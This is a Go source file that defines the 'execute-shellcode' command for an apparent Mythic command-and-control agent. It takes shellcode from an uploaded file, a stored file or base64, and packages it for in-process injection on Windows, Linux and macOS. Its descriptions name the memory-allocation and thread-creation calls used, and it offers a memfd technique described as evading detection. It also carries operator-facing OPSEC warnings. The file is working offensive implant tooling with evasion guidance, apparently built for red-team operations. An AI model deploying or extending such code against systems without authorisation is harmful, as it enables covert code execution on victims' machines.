package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "execute-shellcode",
		Description:         "Execute shellcode in the current process. Windows: VirtualAlloc + CreateThread. Linux: mmap + mprotect. macOS: MAP_JIT (ARM64) or mmap (x86_64). Shellcode runs in a new thread.",
		HelpString:          "execute-shellcode",
		Version:             1,
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "executeshellcode_new.js"), Author: "@galoryber"},
		MitreAttackMappings: []string{"T1059.006", "T1055.012"}, // Command and Scripting Interpreter, Process Hollowing
		SupportedUIFeatures: []string{"process_browser:inject"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Select a shellcode file already registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:          "shellcode_b64",
				CLIName:       "shellcode_b64",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Base64-encoded shellcode (for API/CLI usage)",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:             "technique",
				ModalDisplayName: "Technique",
				CLIName:          "technique",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "Execution technique. mmap: anonymous RW+mprotect RX (default). memfd: memfd_create fd-backed mapping (Linux only, evades anonymous RX detection).",
				Choices:          []string{"mmap", "memfd"},
				DefaultValue:     "mmap",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    "OPSEC WARNING: Shellcode execution in the current process. Allocates RWX→RX memory and creates a new thread. Memory scanners may detect unbacked executable regions. If the shellcode crashes, the agent process will terminate.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Shellcode executed in current process. RWX memory region was allocated and may be detectable by memory scanners. The shellcode thread remains until completion.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Check for direct base64 shellcode first (CLI/API usage).
			// We check the actual arg value rather than ParameterGroupName to be
			// robust against Mythic parameter group resolution edge cases.
			technique, _ := taskData.Args.GetStringArg("technique")
			if technique == "" {
				technique = "mmap"
			}

			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
			if sc != "" {
				// Validate it's actual base64
				decoded, err := base64.StdEncoding.DecodeString(sc)
				if err != nil {
					response.Success = false
					response.Error = "shellcode_b64 is not valid base64: " + err.Error()
					return response
				}
				params := map[string]interface{}{"shellcode_b64": sc, "technique": technique}
				paramsJSON, _ := json.Marshal(params)
				taskData.Args.SetManualArgs(string(paramsJSON))
				displayParams := fmt.Sprintf("Shellcode: base64 (%d bytes), Technique: %s", len(decoded), technique)
				response.DisplayParams = &displayParams
				createArtifact(taskData.Task.ID, "API Call", "VirtualAlloc/CreateThread (self-injection)")
				return response
			}

			// File-based paths: get shellcode from Mythic file storage
			var filename string
			var fileContents []byte

			// Try "file" (new upload) first, then "filename" (existing file dropdown)
			fileID, _ := taskData.Args.GetStringArg("file")
			if fileID != "" {
				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					AgentFileID: fileID,
				})
				if err != nil || !search.Success || len(search.Files) == 0 {
					response.Success = false
					response.Error = "Failed to find uploaded file"
					return response
				}
				filename = search.Files[0].Filename
				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: fileID,
				})
				if err != nil || !getResp.Success {
					response.Success = false
					response.Error = "Failed to get file contents"
					return response
				}
				fileContents = getResp.Content
			} else {
				filename, _ = taskData.Args.GetStringArg("filename")
				if filename == "" {
					response.Success = false
					response.Error = "No shellcode provided (shellcode_b64, file, or filename required)"
					return response
				}
				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					CallbackID:      taskData.Callback.ID,
					Filename:        filename,
					LimitByCallback: false,
					MaxResults:      -1,
				})
				if err != nil {
					logging.LogError(err, "Failed to search for file")
					response.Success = false
					response.Error = "Failed to search for file: " + err.Error()
					return response
				}
				if !search.Success || len(search.Files) == 0 {
					response.Success = false
					response.Error = fmt.Sprintf("File not found: %s", filename)
					return response
				}
				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: search.Files[0].AgentFileID,
				})
				if err != nil || !getResp.Success {
					response.Success = false
					response.Error = "Failed to get file contents"
					return response
				}
				fileContents = getResp.Content
			}

			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes), Technique: %s", filename, len(fileContents), technique)
			response.DisplayParams = &displayParams
			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("Shellcode self-injection via %s (%d bytes)", technique, len(fileContents)))

			params := map[string]interface{}{
				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
				"technique":     technique,
			}
			paramsJSON, err := json.Marshal(params)
			if err != nil {
				response.Success = false
				response.Error = "Failed to create task parameters"
				return response
			}
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			host := processResponse.TaskData.Callback.Host
			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           processResponse.TaskData.Task.ID,
				BaseArtifactType: "Process Injection",
				ArtifactMessage:  fmt.Sprintf("Shellcode execution (self-inject) on %s", host),
			})
			logOperationEvent(processResponse.TaskData.Task.ID,
				fmt.Sprintf("[EXECUTION] Shellcode executed in-process on %s", host), true)
			return response
		},
	})
}
